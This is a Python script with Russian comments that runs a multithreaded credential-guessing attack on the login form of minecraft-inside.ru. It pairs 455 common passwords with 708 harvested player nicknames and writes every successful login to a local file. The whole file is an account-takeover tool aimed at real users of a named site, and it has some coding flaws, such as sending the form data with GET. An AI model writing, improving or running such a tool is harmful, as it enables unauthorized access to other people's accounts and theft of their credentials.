#coding: UTF-8
from threading import Thread
import requests
import json
import os
from bs4 import BeautifulSoup as BS

kol=0
url = 'https://minecraft-inside.ru/login/'
def loginbot(login1,password1):  #Функция пробует зайти на сайт и возвращает валидность логина и пароля
    global log
    global pas
    global kol
    while kol<len(pas)*len(log)-1:
        kol=kol+1
        kk=kol
        login=log[kk%len(pas)]
        password=pas[kk//len(pas)]
        proc = os.getpid()
        s = requests.Session()
        s.get(url)
        data = {
                'LoginForm[username]':login,
                'LoginForm[password]':password,
                }
        r=s.get(url,data=data)
        html = BS(r.content,'html.parser')
        for el in html.select('.profile-bar'):
            title = el.select('.profile-bar > a')
            if len(title)>0:
                if title[0].text=='Войти':
                    print(str(kk)+' Неудачно: Логин "'+login+'" Пароль: "'+password+'"   '+title[0].text)
                else:
                    print(str(kk)+' Удачно: Логин "'+login+'" Пароль: "'+password+'"   '+title[0].text)
                    g=open('itog.txt','a')
                    g.write(' Удачно: Логин "'+login+'" Пароль: "'+password+'"')


pas=[]
log=[]

passw=open('топ 500 паролей.txt','r')
for i in range(455):
    s=passw.readline()
    pas.append(s[:len(s)-1])
    
logg=open('все ники игроков с публикациями.txt','r')
for i in range(708):
    s=logg.readline()
    log.append(s[:len(s)-1])

kolPr=5
Process=[]
for i in range(kolPr):
    Process.append('')
    Process[i] = Thread(target=loginbot, args=('GG', 'GG',))
    Process[i].start()

for i in range(kolPr):
    Process[i].join()

